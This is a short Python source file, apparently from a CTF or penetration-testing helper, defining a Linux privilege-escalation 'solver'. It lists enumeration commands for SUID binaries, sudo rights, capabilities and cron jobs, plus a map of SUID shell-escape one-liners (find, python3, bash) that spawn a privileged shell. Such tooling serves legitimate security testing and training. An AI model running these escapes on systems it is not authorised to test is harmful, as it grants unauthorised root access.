"""
Bounded Context: Privesc Domain Solver
Responsabilidade Única (SRP): Enumeração de escalada de privilégios e binários SUID.
"""
from typing import List, Dict, Any

class PrivescDomainSolver:
    """Solver especializado para Escalada de Privilégios (Linux / SUID / Sudo)."""

    def get_checklist(self) -> List[Dict[str, str]]:
        return [
            {"name": "SUID binaries", "command": "find / -perm -u=s -type f 2>/dev/null", "description": "Binários SUID"},
            {"name": "Sudo permissions", "command": "sudo -l 2>/dev/null", "description": "Permissões sudo"},
            {"name": "Capabilities", "command": "getcap -r / 2>/dev/null", "description": "Linux capabilities"},
            {"name": "Cron jobs", "command": "cat /etc/crontab 2>/dev/null; crontab -l 2>/dev/null", "description": "Tarefas crontab"},
        ]

    def get_suid_exploits(self) -> Dict[str, str]:
        return {
            "/usr/bin/find": "find . -exec /bin/sh -p \\; -quit",
            "/usr/bin/python3": "python3 -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'",
            "/usr/bin/bash": "bash -p",
        }
